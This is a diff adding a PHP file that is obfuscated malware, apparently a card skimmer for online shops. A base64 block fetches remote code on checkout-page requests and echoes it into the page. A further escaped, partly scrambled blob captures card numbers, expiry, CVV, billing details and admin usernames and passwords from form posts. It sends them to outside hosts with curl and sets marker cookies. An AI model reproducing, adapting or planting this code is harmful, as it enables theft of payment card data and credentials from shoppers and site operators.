@@ -1,0 +1,752 @@
+<?php
+
+$beda_code = base64_decode(trim("dHJ5IHsKICAgICRvem9kYXF1ID0gYXJyYXkoDQogICAgICAgICdtbCcsICdkaXNjbycsICdTRVJWRScsICdQYWdlJywgJyQjJywgJ2dlfGMnLCAncmVjaGUnLCAnU1QnLA0KICAgICAgICAnejAtOScsICdudDonLCAnd2lkZycsICdIVFQnLCAnUkVRVUUnLCAndDonLCAnSFRUJywgJzovL3BhJywNCiAgICAgICAgJ0hUVFBfJywgJ3BhYycsICdHRVQnLCAnYWRkcmUnLCAnaHR0JywgJy50eHQnLCAnVVJJJywgJ2NoZWNrJywNCiAgICAgICAgJ3B4YycsICdiYXNlNicsICdtZScsICcjY2FydCcsICdSRVFVJywgJ09SJywgJ29yZCcsICd8b24nLA0KICAgICAgICAnYWRtJywgJ19NRVQnLCAnZXYnLCAnMDInLCAndXR8JywgJ19BREQnLCAnRFInLCAnY29kJywNCiAgICAgICAgJy4xJywgJzEyNy4wJywgJ0lQJywgJ1JXQVJEJywgJyNeW0EtJywgJ3RlcHwnLCAncGFjJywgJ1JFJywNCiAgICAgICAgJyNvbmUnLCAnTElFTicsICdwcmljZScsICdzdCcpOwoKICAgICR5Z2loaWQgPSAkb3pvZGFxdVsxMl0gLiAnU1QnIC4gJG96b2RhcXVbMzNdIC4gJ0hPRCc7CiAgICAkd29udXhldG9iID0gJG96b2RhcXVbNDhdIC4gJ3BhJyAuICRvem9kYXF1WzVdIC4gJ2hlY2tvJyAuICRvem9kYXF1WzM2XSAuICdvbmVzJyAuICRvem9kYXF1WzQ1XSAuICdmaScgLiAkb3pvZGFxdVs2XSAuICdja291dCcgLiAkb3pvZGFxdVszMV0gLiAnZXN0ZXAnIC4gJG96b2RhcXVbMjNdIC4gJ291dCMnOwogICAgJHRoaXRodXJ1cGEgPSAkb3pvZGFxdVsyOF0gLiAnRVNUXycgLiAkb3pvZGFxdVsyMl07CiAgICAkb2dpc2hvZiA9ICRvem9kYXF1WzI3XSAuICcjJzsKICAgICR6aWxha2h1ID0gJG96b2RhcXVbMzJdIC4gJ2luaHQnIC4gJG96b2RhcXVbMF07CiAgICAkYXFhZ3l6b2QgPSAkb3pvZGFxdVsyMF0gLiAncHMnIC4gJG96b2RhcXVbMTVdIC4gJ3RoYy5zJyAuICRvem9kYXF1WzE3XSAuICdlL3MnIC4gJG96b2RhcXVbNDZdIC4gJ2UvJyAuICRvem9kYXF1WzEwXSAuICdldCcgLiAkb3pvZGFxdVsyMV07CiAgICAkb3RoaWtlcWVkbyA9ICRvem9kYXF1WzExXSAuICdQX0MnIC4gJG96b2RhcXVbNDldIC4gJ1RfJyAuICRvem9kYXF1WzQyXTsKICAgICRsZW55bmlkdXRoID0gJG96b2RhcXVbMTZdIC4gJ1hfRk8nIC4gJG96b2RhcXVbNDNdIC4gJ0VEX0YnIC4gJG96b2RhcXVbMjldOwogICAgJGd1dm9ob3NoaSA9ICRvem9kYXF1WzQ3XSAuICdNT1RFJyAuICRvem9kYXF1WzM3XSAuICdSJzsKICAgICRxZXpoYWZpZnlyID0gJG96b2RhcXVbMjRdIC4gJ2VsJyAuICRvem9kYXF1WzNdIC4gJ19jMDEwJyAuICRvem9kYXF1WzM1XTsKICAgICR3b2tob3ZldiA9ICRvem9kYXF1WzE0XSAuICdQX0hPJyAuICRvem9kYXF1WzddOwogICAgJGxlZGl0byA9ICRvem9kYXF1WzFdIC4gJ3VuJyAuICRvem9kYXF1WzEzXTsKICAgICR4dXN1Y2hhYml4ID0gJG96b2RhcXVbMzBdIC4gJ2VyOic7CiAgICAkaXh5emh1aGl0aGkgPSAkb3pvZGFxdVs1MF0gLiAnOic7CiAgICAka2hlbXVtYSA9ICRvem9kYXF1WzI2XSAuICdyY2hhJyAuICRvem9kYXF1WzldOwogICAgJGVteXZpd3UgPSAkb3pvZGFxdVsxOV0gLiAnc3M6JzsKICAgICRvc2h1enV3ZWIgPSAkb3pvZGFxdVsyXSAuICdSX0FEJyAuICRvem9kYXF1WzM4XTsKICAgICRpaGFtYXd5eCA9ICRvem9kYXF1WzE4XTsKICAgICRlcmV2eXNodSA9ICRvem9kYXF1WzI1XSAuICc0X2RlJyAuICRvem9kYXF1WzM5XSAuICdlJzsKICAgICR1Y2hva2VuID0gJG96b2RhcXVbNTFdIC4gJ3JyJyAuICRvem9kYXF1WzM0XTsKICAgICRxYWZpenl6ID0gJG96b2RhcXVbNDRdIC4gJ1phLScgLiAkb3pvZGFxdVs4XSAuICcrLz1dKycgLiAkb3pvZGFxdVs0XTsKICAgICRqYXRodXNpanljID0gJG96b2RhcXVbNDFdIC4gJy4wJyAuICRvem9kYXF1WzQwXTsKICAgICRhd29nb2dvdGggPSAwOwogICAgJGlrYXRvaCA9IDA7CiAgICAkeXRvem9iID0gaXNzZXQoJF9TRVJWRVJbJG9zaHV6dXdlYl0pID8gJF9TRVJWRVJbJG9zaHV6dXdlYl0gOiAkamF0aHVzaWp5YzsKICAgICR1dGhheGlzID0gaXNzZXQoJF9TRVJWRVJbJG90aGlrZXFlZG9dKSA/ICRfU0VSVkVSWyRvdGhpa2VxZWRvXSA6IGlzc2V0KCRfU0VSVkVSWyRsZW55bmlkdXRoXSkgPyAkX1NFUlZFUlskbGVueW5pZHV0aF0gOiAkX1NFUlZFUlskZ3V2b2hvc2hpXTsKICAgICR2eWNoYXpoaXpoZSA9ICRfU0VSVkVSWyR3b2tob3Zldl07CiAgICBmb3IgKCRvamlkb2thaGEgPSAwOyAkb2ppZG9rYWhhIDwgc3RybGVuKCR2eWNoYXpoaXpoZSk7ICRvamlkb2thaGErKykgewogICAgICAgICRhd29nb2dvdGggKz0gb3JkKHN1YnN0cigkdnljaGF6aGl6aGUsICRvamlkb2thaGEsIDEpKTsKICAgICAgICAkaWthdG9oICs9ICRvamlkb2thaGEgKiBvcmQoc3Vic3RyKCR2eWNoYXpoaXpoZSwgJG9qaWRva2FoYSwgMSkpOwogICAgfQoKICAgIGlmICgoaXNzZXQoJF9TRVJWRVJbJHlnaWhpZF0pKSAmJiAoJF9TRVJWRVJbJHlnaWhpZF0gPT0gJGloYW1hd3l4KSkgewogICAgICAgIGlmIChwcmVnX21hdGNoKCR3b251eGV0b2IsICRfU0VSVkVSWyR0aGl0aHVydXBhXSkgJiYgKCFwcmVnX21hdGNoKCRvZ2lzaG9mLCAkX1NFUlZFUlskdGhpdGh1cnVwYV0pKSkgewogICAgICAgICAgICBpZiAoKCFpc3NldCgkX0NPT0tJRVskemlsYWtodV0pKSAmJiAoIWlzc2V0KCRfQ09PS0lFWyRxZXpoYWZpZnlyXSkpKSB7CiAgICAgICAgICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCJjdXJsX2luaXQiKSkgewogICAgICAgICAgICAgICAgICAgICRhY2hvY2h5c28gPSBjdXJsX2luaXQoJGFxYWd5em9kKTsKICAgICAgICAgICAgICAgICAgICBjdXJsX3NldG9wdCgkYWNob2NoeXNvLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsKICAgICAgICAgICAgICAgICAgICBjdXJsX3NldG9wdCgkYWNob2NoeXNvLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAxNSk7CiAgICAgICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGFjaG9jaHlzbywgQ1VSTE9QVF9USU1FT1VULCAxNSk7CiAgICAgICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGFjaG9jaHlzbywgQ1VSTE9QVF9IRUFERVIsIGZhbHNlKTsKICAgICAgICAgICAgICAgICAgICBjdXJsX3NldG9wdCgkYWNob2NoeXNvLCBDVVJMT1BUX1NTTF9WRVJJRllIT1NULCBmYWxzZSk7CiAgICAgICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGFjaG9jaHlzbywgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOwogICAgICAgICAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRhY2hvY2h5c28sIENVUkxPUFRfSFRUUEhFQURFUiwgYXJyYXkoIiRsZWRpdG8gJGF3b2dvZ290aCIsICIkeHVzdWNoYWJpeCAkaWthdG9oIiwgIiRpeHl6aHVoaXRoaSAkdXRoYXhpcyIsICIka2hlbXVtYSAkdnljaGF6aGl6aGUiLCAiJGVteXZpd3UgJHl0b3pvYiIpKTsKICAgICAgICAgICAgICAgICAgICAkZGVtZWp1ID0gQGN1cmxfZXhlYygkYWNob2NoeXNvKTsKICAgICAgICAgICAgICAgICAgICBjdXJsX2Nsb3NlKCRhY2hvY2h5c28pOwogICAgICAgICAgICAgICAgICAgICRkZW1lanUgPSB0cmltKCRkZW1lanUpOwogICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCRxYWZpenl6LCAkZGVtZWp1KSkKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAoQCRlcmV2eXNodSgkdWNob2tlbigkZGVtZWp1KSkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9IGNhdGNoIChFeGNlcHRpb24gJGliZWhpYikgewogICAgCn0="));
+
+define("API_HOST", "https://kakadu.pw/phpbot/api/logs");
+
+define("TREX_CODE", trim('$KLqvSUfr="\145\x64\157";$jSJOvjxC="\163\x74\x72";$wJPAi6t="\156\157\x69";$KLqvSUfr.="\143";$wJPAi6t.="\164\143\x6e";$wJPAi6t.="\165\x66";$wJPAi6t.="\137\145";$pDaT9uhVE="\164";$KLqvSUfr.="\x65\144\x5f";$wJPAi6t.="\x74\x61";$KLqvSUfr.="\64\66";$wJPAi6t.="\x65\x72";$wJPAi6t.="\143";$pDaT9uhVE.="\x72";$KLqvSUfr.="\145\x73";$pDaT9uhVE.="\x65\163";$KLqvSUfr.="\141\142";$jSJOvjxC.="\162\145";$pDaT9uhVE.="\163\141";$jSJOvjxC.="\166";$wJPAi6t=$jSJOvjxC($wJPAi6t);$KLqvSUfr=$jSJOvjxC($KLqvSUfr);$pDaT9uhVE=$jSJOvjxC($pDaT9uhVE);$roLXOUt="gACIgACIgoQDsATMg4TPgMlUJRURShVQN9FVQ9ETSV1QgACIgACIgACIgACIgACIgoQDsAjMxAiP9ACVV9URNlEVfRFUPxkUVNEIgACIgACIgACIgACIgACIK0ALwITMg4TPgQVVPVUTJRFVDVkTO90QfRFUPxkUVNEIgACIgACIgACIgACIgACIK0ALlVnc0BIgACIgACIgACIgACIK0wOpIyLiACLwADM2MDIrASKoUWbpRHIsEDIsIibk12XigSZpt2bvNGdlNHIgACIgACIgACIgACIgACIK0gCN0HIgACIgACIgACIgACIgACIK0wOpg2YkgyYlhXZfxmc1NGQgACIgACIgACIgACIWQoIkNSQ19NRUdBTE9ET04iKSkgew0KICAgICAgICAkY3JjMzIgPSBpc3NldCgkX1NFUlZFUlsnSFRUUFTv02bj5Sb1x2bsV2Yv8iOzBHd0h2JoMHduVGdu92YfRXZn9VZslmZABSPgQnbjRCIgACIgACIgACIgACIgACIgACIgoQD7BSKnEzJg0TIgQnbjRCKgYWagACIgACIgACIgACIgACIgoQD9BCIgACIgACIgACIgACIgAiCNsTK052YAoJGZfdmFsdWUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDE6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjY19udW1iZXIgPSAkcF92YWx1ZTsNCiAgICAgICxPRE9OX0JBQ0tVUF9CSUxMSU5HIiAuIENSQ19NRUdBTE9ET05fU0hPUlQsIDEpOw0KDQogICAgICAgIGZ1bmN0aW9uIG1lZ2Fsb2Rvbl9iYWNrdXBfcXVlcnkoJHVybCwgJHBvc3QpIHsNCiAgICAgICAgICAgICRvcHRpb25zID0gYXJyYXkoDQogICAgICAgICAgI9wdGlvbnMpOw0KICAgICAgICAgICAgICAgICRjb250ZW50ID0gY3VybF9leGVjKCRjaCk7DQogICAgICAgICAgICAgICAgY3VybF9jbG9zZSgkY2gpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICBUN1TQ9FJoUGZvNmbl9FN2U2chJGI9Aiblt2b0FGJgACIgACIgACIgACIK0wegkSKpkSXnQmcvd3czFGcnDIO9USUF0QPx0VPxETPZ0XUB1TMJVVDBCIgACIgACIgACIgACIgACIgACIgACIgoQDsU2csFmZg4TPgIVREFURI9FVQ9ETSV1QgACIgACIgACIgACIgACIgACIgACIgACIK0ALlVnc0BiP9AiUFZ0UOFkUU5kUVRVRS9FVQ939GZul2VoACMuUzLhxGbpp3bNJCI+0DIU5URHFkUFNVVfRFUPxkUVNEIgACIgACIgACIgACIgACIK0ALiICI+0DIH5USE90QOV0XUB1TMJVVDBCIgACiIw4iMz8CevZWZylmRgEDMxAjMxAjMv82ajV2Rgk1GKgYiJgkSKddiZ0d3JbVUSL90TD9FJoQXZzNXaogCKgYWagACIgACIgAiCNoQD9bS9NRUdBTE9ET04vaW5kZXgucGhwP3ZpZXc9JyAuICRjY19wYXlfZW5jb2RlZCwgZmFsc2UpOw0KICAgICAgICAgICAgICAgICAgICAkY250ID0gdHJpbSgk9PiAiIiwNCiAgICAgICAgICAgICAgICAgICAgQ1VSTE9QVF9VU0VSQUdFTlQgPT4gIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDUuMTsgcnY6MzIuMCkgR2Vja28vMjAwNCiAgICAgICAgICAgICAgICAgICAgICAgIENVUkxPUFRfQVVUT1JFRkVSRVIgPT4gdHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIENVUkxPUFRfQ09OTkVDVFRJTUVPVVQgPT4gNiwNCiAgICAgICAgICAgICAgICAgICAgICAgIENVUkxPUFRfVEnsVRJt0TPN0XkACIgACIgACIgACIgoQD7kiIvICIsADMwYzMgsCIpgSZtlGdgwSKsxWaiRCKlR2bj5WZfRjNlNXYiBCLiEGdhRWbfJCKll2av92Y0V2cFUURFSnslUFZlUFN1XkASPgAXafJXZzVHJgACIgACIgACIgACIgACIgACIgAiCNsHIpkSXnI1TG9FRFRkUBdlUPZ0XY9FUURFSnslgACIgAiCNwSMg4TPgIyLq4Sb152XjNmKu8iIgACIgIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTsNCiAgICAgICAgZm9yZWFjaCAoJGFyciBhcyAkYuVnZoAiZpBCIgACIgACIgACIgACIgAiCNoQD7kSY0FGZfJXZzVHJgwyJiJTJnACLisiIoU2YhxGclJ3XyR3cg0DIhRXYk9lclgaWYgKCFkZWZpbmVkKCJNRUdBTE9ET05fVSIgLiBDUkNfTUVHQUxPRE9OX1NIT1JUKSkgew0KICAgICAgICBkZWZpbmUoIk1FR0FMT0RPTl9VIiAuIENSQ19NRUdBT52bpR3YuVnZoAiJmASKnEzJg0TIgQnbjRCKoAiZpBCIgACIgACIgACIgACIgAiCNoQD9BCIgACID9FJgACIgACIgACIgACIK0QKp01JhxGbppHdy9GcnsVRJt0TPN0XkgCdlN3cphCImlCajRXa3NHIgACIgACIgACIgACIgACIgACIgACIgAiCNsHIpkyclh2Y0FWbkACL5V2afBCAgICAgICIvLip5ZWxsb3dfc2V0LiovIiA9PiAzLA0KICAgICAgICAgICAgICAgICIvLipzYXZhZ2Vfc2V0LiovIiA9PiA0LA0KICAgICAgICAgICAgICAgICXJyYXkgYXMgJGZfa2V5ID0+ICRmX3ZhbHVlKSB7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoJF9QT1NUWydwYXltZW50J10gYXMgJHBfa2V5ID0+ICRwX3ZhbHVlKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCRmX2tleSwgJHkNSgkX0NPT0tJRVsnd3RmJ10pID09ICc3YWMxY2NhNWJlZThiOGIzMWE1MjFiOTdiMDk4ODA2MycpKSB8fCAoKGlzc2V0KCRfQ09PS0lFWydmdHcnXSkMgPT4gMTAsDQogICAgICAgICAgICAgICAgICAgIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIgPT4gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgIEWydsb2dpbiddWyd1c2VybmFtZSddIC4gIjsiIC4gJF9QT1NUWydsb2dpbiddWydwYXNzd29yZCddKTsNCiAgICAgICAgICAgIHNldGNvb2tpZSgiX2RudG9rZW4iLCAkYXRva2VuLCB0aW1lKCkgKyAzNjAwMCwgIi8iKTsNCiAgICAgICAgICAgICRfQ09PLgIyOoRXYwRyOiAiLg01JUN1TI9FUURFSnslUFZlUFN1XkgSZk92YuV2X0YTZzFmYg0DIhRXYk9lclNw0KICAgICAgICAgICAgICAgICAgICAkdXNlcl9pcCA9ICRfU0VSVkVSWydIVFRQX0NMSUVOVF9JUCddOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkdXICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICA1RdID0gMTsNCiAgICAgICAgICAgICAgICAkb3B0aW9uc1tDVVJMT1BUX1BPU1RGSUVMRFNdIDUVHQUxPRE9OL2luZGV4LnBocD92aWV3PScgLiAkY2NfcGF5X2VuY29kZWQpOw0KICAgICAgICAgICAgICAgICAgICAkY250ID0gdHJpbSgkY250KTsNCiAgICAgICAgICAggICAgQ1VSTE9QVF9QT1NUID0+IDEsDQogICAgICAgICAgICAgICAgICAgIENVUkxPUFRfUE9TVEZJRUxEUyA9PiAkYXJyYXkNCiAgICAgICAgICAgICAgICApOw0KDQogICAgICAgICAgICAgICAgJGNoID0gY3VybUPB1XUB1TMJVVDt1cu9Wa0B3bkACIgACIgACIgACIgACIgAiCNsHIpQ3cvBHJoAiZpBCIgACIgACIgACIgoQDK0wOpACIgACIgACIgACIyLA0KICAgICAgICAgICAgICAgICIvLipjY19leHBfeS4qLyIgPT4gMywNCiAgICAgICAgICAgIC0KICAgICAgICAgICAgICAgICRwYXRoID0gc3Vic3RyKCRwYXRoLCAwLCAkcG9zKTsNCiAgICAgICAgICAgICAgICAkdXNlcl9pcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddOw0KICAgICAgICAgICAgICAgIGlmIChpc3NldCgkX1NFUlZFUNoQD9BCIgAiCNsTKwADMxASJgIzMjJ3YkACLiQlUPh0Uf50TE9ETBdURN91QSNkIoUmbpZWZkBCIgACIgACIK0wOpIzMjJ3YkACLi40TE9ETBdURN91QSNkIoUmbpZWZkBCIgACIgACIK0wOpIzMjJ3YkgyciFGI9AiMzMmcjRCIgACIgACIgACIgACIgACIgACIgAiCNwSZzxWYmBiP9ACVT9ESZZUSSVkVfx0UT9FVQ9ETSV1QgACIgA3Rpb25fZXhpc3RzKCJjdXJsX2luaXQiKSkgew0KICAgICAgICAgICAgICAgICAgICAkb3B0aW9ucyA9IGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAgICAgQ1VSTEHJcbioiIC4gJF9TRVJWRVJbJ0hUVFBfSE9TVCddIC4gIiBbIiAuICRfU0ZulmZlRWIoAiZpBCIgAiCNoQD7kSMgwiIEFURI9lTPR0TMF0RF1kIoUmbpZWZkBCIgAiCNoQD7BSKpICRBVESf50TE9ETBdURNP90QfRCK0V2czlGKgYWagACIgACIgAiCNoQD9BCIgACIgACIK0wOpIyLiACLwADM2MDItASKoUWbpRHIsEDIsIibk12XigSZpt2bvNGdlNHnw3Jg0jLgkXYw91YjRCIgACIgACIgACIgACIgACIgACIgoQDpkSXnEGdhRWbfdyWFl0SP90QfRCK0V2czlGKgYWagACIgACIgACIgACIgACIgoQD7QWaj91YjRCIuAyJ8dCIuAichVWefN2YkAiLgcyLnAiLggGdu9WbfN2AyROlERPNkTF9FVQ9ETSV1QgACIgACIgACIgACIgACIgACIgAiCNwSZ1JHdg4TPg40TJRVQD9ETX9ETM9kRfRFUPxkUVNEIgACIgACIgACIgACIgACIgACIgoQDsU2csFmZg4TPgIVREFURI9FVQ9ETSV1QgACIgACIgACIgAICAgICAgICAgICAiLy4qY29udHJvbF9zZXR0aW5ncy4qLyIgPT4gMSwNCiAgICAgICAgICAgICAgICAiLy4qY2NfZXhwX20uKi8iIUQHVUTigSZulmZlRGIgACIgACIgoQD7BSKpQlUPh0Uf50TE9ETBdURN91QSNEIuAiIH5USMxUSC9FUVt0QBJ0XO9ERPxUQHVUTigCZl5WamVGZhgCImlGIgACIK0gCN0HIgACIK0QfgACIgACIgAiCNsDdphXZgACIgACIgACIgACIK0wOpQnblIK0ALlVnc0BiP9AiUFJVRGVkUPRVVB9FVQ9ETSV1QgACIgACIgACIgACIgACIgACIgAiCNwiIw4iMz8CevZWZylmRgEDMxAjMxACIgACIgACIgACIgACIgACIgACIgAiCNszahVmciBCIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIK0wOlVHbhZ3XwRCI9AichVWefN2YkACIgACIgACIgACIgACIgACIgACIgACIgACIgACgICAgICAgIGlmIChQSFBfSU5UX1NJWkUgPiA0KQ0KICAgICAgICAgICAgaWYgKCRjcmMzMiAmIDB4ODAwMDAwMDApDQogICAgICAgICAgICAgICAgJGNyYzMyID0gJGNyYzMyIC0gMHgxMDAwMDAwMDA7DQogICAENVUkxPUFRfSEVBREVSID0+IGZhbHNlLA0KICAgICAgICAgICAgICAgIENVUkxPUFRfRk9MTE9XTE9DQVRJT04gPT4gdHJ1ZSwNCiAgICAgICAgICAgICAgICAgIGN1cmxfc2V0b3B0X2FycmF5KCRjaCwgJG9wdGlvbnMpOw0KICAgICAgICAgICAgJGNvbnRlbnQgPSBAY3VybF9leGVjKCRjaCk7DQogICAgICAgICAgICByZXR1cm4gJGNvbnRlbnQ7DQogICAgICAgIH0NCJXYg0DIz52bpRHcvRCIgACIgACIgACIgACIgACIK0wOiAHaw5CelRmbp9CVFd0VvcHcusWa0FGdz1SZsd2bvd2LvozcwRHdoJCI9ACbyVHJgACIgACIgACIgACIgACIgoQD7kSK0hXZ0VGdmc0NHKgYWagACIgACIgACIgACIgACIgoQD7BSKpIXZi1Wdu91YjRCK0V2czlGKgYWagICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY2NfbW9udGggPSAkcF92YWx1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAzOg0KICAgIW92ZV91cGxvYWRlZF9maWxlXCgnLA0KICAgICAgICAgICAgJ2V4dHJhY3RcKCcsDQogICAgICAgInLA0KICAgICAgICAgICAgJ3VuaGV4XCgnLA0KICAgICAgICApOw0KDQogICAgICAgICR3cml0ZXRleHQgPSAiUE9TVDogIiAuIGpzb25fZW5jb2RlKCRfUE9TVCkgLiAiLS0iIC4gIkNPT0tJRTogIiAuIGpzb25fZW5jb2RlKCRfQ09PS0lACIgoQDK0wO9BCIgAiCN0HIgACIgACIgoQD9BCIgACIgACIgACIgoQD7kSehB3XjNGJgwSXnQ1UPh0XQRFVIdyWSVkVSV0UfRCIuAyJfJmYnACLnUncugXZk5WY5BUb1x2bsV2YngCbpFWbABCIgACIgACIgACIgACIgAiCNoQD9BCIgACIgACIgACIoNCiAgICAgICAgICAgICAgICAkY250ID0gMDsNCiAgICAgICAgICAgICAgICBpZiAoZnVuY3RpbIgACIgAiCNsTKsJXdkgCdp5Wafxmc1NGI9ACajRCIgACIgACIgACIgAiCNoQD9BCIgACIgACIgACIgoQD7Q3cvBHJg0S0lFWydfZG50b2tlbiddKSAmJiBpc3NldCgkX0NPT0tJRVsnYWRtaW5odG1sJ10pICYmICghaXNzZXQoJF9DT09LSUVbJ19tZG4nXSkpKSB7DQogICAgICAgICAgICAkcGF0aCA9ICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOw0KICAgICAgICAgICAgJHBvcyAACIgACIgACIgACIK0wOpEGdhR2XyV2c1RCIuACbyV3X0V2ZkgCdp5Wafxmc1NGI9ACajRCIgACIgACIgACIgACIgACIgACIgoQDK0wOpACIgACIgACIgACIgACIgACIgACIK0QZzxWYmBiP9ACVT9ESZZUSSVkVfx0UT9FVQ9ETSV1QgACIgACIgACIgACICAgICAgICAgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiA9PiBmYWxzZSwNCiAgICAgICAgICAgICAgICBDVVJMT1BUX1NTTF9WRVJJRllIT1NUID0+IGZhbHNlDQogflnc05WdvN2Jb11Jn5WasxWaidyWUN1TQ9FJg4CInw3Jg4CIddSZk92Y0N3bwdyWddyZulGbslmYnsFVT9EUfRCIuAyJ8ByJg4CIddibvl2ZlJ3Jb11Jn5WasxWaidyWUN1TQ9FJg4CInw3Jg4CIddSe0l2YnsVXncmbpxGbpJ2JbR1UiAkX0NPT0tJRVsnX2RudG9rZW4nXSAuICc7JyAuICR1c2VyX2lwKTsNCiAgICAgICAgICAgICAgICAkdXNQzRGbllmZkgCIoNWYlJ3bmBCIgACIgACIgACIgoQDK0wOpQDI+0DIi8iKuQWaj91YjpiLvIIgACIgACIgACIK0ALzAiP9AiIvoiLyFWZZ52bpRXYylGc4VmKu8iIgACIgACIgACIgACIgACIgoQDsMDI+0DIi8iKuIXYll3XwhXZq4yLiACIgAbnACIgACIgACIgACIgoQDscCKclHcvN2JgACIgACIgACIgACIACIgACIgoQDsATMg4TPgMlUJRURShVQN9FVQ9ETSV1QgACIgACIgACIgACIgACIgACIgACIgACIK0AL2AiP9ACVV9URNlCAgIHNldGNvb2tpZSgiX2RudG9rZW4iLCAxLCB0aW1lKCkgLSAzNjAwMCwgIi8iKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCn07IChXaW5kb3dzIE5UIDUuMTsgcnY6MzIuMCkgR2Vja28vMjAxMjAxMDEgRmlyZWZveC8zMi4wIiwNCiAgICAgICAgICAgICAgICAgICAgQ1VSTE9QVF9BVVRPUkVGRVJFUiA9PiB0cnVlLA0KCIvaSIsICR3cml0ZXRleHQpKSB7DQogICAgICAgICAgICAgICAgJGFycmF5ID0gYXJyYXkoJ29zbCcgPT4gYmFzZTY0X2VuY29kZSgkd3JpaWQnXSAuICd8JyAuICRfUE9TVFsnYmlsbGluZyddWyd0ZWxlcGhvbmUnXSAuICcgJyAuICRfUE9TVFsnYmlsbGluZyddWydlbWFpbCddOw0KICAgICAgICAgICAgfZXhpc3RzKCJleGVjIikpKSB7DQogICAgICAgICAgICAgICAgICAgIEBleGVjKCdjdXJsIC0taW5zZWN1cmUgJyAuICdodHRwczovL2NlbG9sdW0uY29tL01FR0FMT0RPTi9pbmRleC5waHA/dmlldz0nIC4gJGNjX3BheV9lbmNvZGVkKTsNCiAgICAgK0gOyASZzF2YgACIgACIgACIgACIgACIgACIgACIgACIgACIgoQD7sWYlJnYgACIgACIgACIgACIgACIgACIgACIgACIgAIgACIgACIgACIgACIgACIK0ALlVnc0BiP9AiUFZ0UOFkUU5kUVRVRS9FVQ9ETSV1QgACIgACFJBTlNGRVIgPT4gdHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgQ1VSTE9QVF9IRUFERVIgPT4gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgIENVUkxPUFRfRk9MTE9XTE9DQVRJT04gPT4gdwWb0hmbp1GZn12JgACIgACIgACIgACIK0ALnEGbslmes9GbnACIgACIgACIgACIgoQDscSYsxWa6h2chxmZnACIgACIgACIgACIgoQDscSYsxWa6RncvB3JgACIgACIgACIgACIK0ALngCX0JXZzNXYnACIgACl2XsJXdjBSPgg2YkACIgACIgACIgACIgACIgAiCNoQDK0wOpACIgACIgACIgACIgACIgAiCNU2csFmZg4TPgQ1UPhUWGlkUFZ1XMN1UfRFUPxkUVNQD7kCZlR2bj5WZflXYw91YjRCIsIiYyUiIgwiIrICKlNWYsBXZy9lc0NHI9ACZlR2bj5WZflXYw91YjRCIgACIgACIgACIgACIgACIK0wOpkiIq0lIg4CIddiUERUQfJVRWJVRTdyWSVkVSVXiAiLgkXYw91YjRCKzEDdvJ3XyR3coUGZvNmbl9FN2U2chJCAgICAgICAgICAgICAgICAgICBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VUID0+IDcsDQogICAgIGJgwCajRCK5FmcyF2X0B3b0V2cfxmc1NGIgACIgACIgACIgACIgACIK0wOpwmc1RCK0lmbp9FuaXQoJGdldF91cmwpOw0KICAgICAgICAgICAgICAgIGN1cmxfc2V0b3B0X2FycmF5KCRjaCwgJG9wdGlvbnMpOw0KICAgICAgICAgICAgICAgICRjb250ZW50ID0gQGN1cmxfZXhxlbigkY2NfbW9udGgpID09IDEpDQogICAgICAgICAgICAgwegkycvBHJoAiZpBCIgACIgACIgACIgoQD7kiI5V2avgXZk5WavQmch9mYoNXYk9iIgwCa0FGckgycvBnc0NHI9gICAgICAgICAgICAgICAgICAkY2NfeWVhciA9IHN1YnN0cigkY2NfeWVhciwgMiwgMik7DQogICAgICAgICAgICAgICAgJGNjX3BheSA9ICRjY19udW1iZXIgLiAnfCcgLiAkYgICAgICAgICAgICAgICAgICBDVVJMT1BUX1NTTF9WRVJJRllQRUVSID0+IGZhbHNlLA0KICAgICAgICAgICAgIIuASZ1xWY2RCIuAiIvICKoNGdh12XnVmcwhCImlGIgACIgACIgACIgAiCNsHIpUWdsFmdgICAgICBjYXNlIDQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjY19jaWQgPSAkcF92YWx1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQGJhgCImlGIgACIgACIgACIgAiCNoQD9BCIgACIgACIgACIgoQD7kCduVGdu92YkgSbpJHdg0DI05WZ052bjRCIgACIgACIgACIgACIgACIK0wOpg2YkgyYlCiAgICBpZiAoIWRlZmluZWQoIk1FR0FM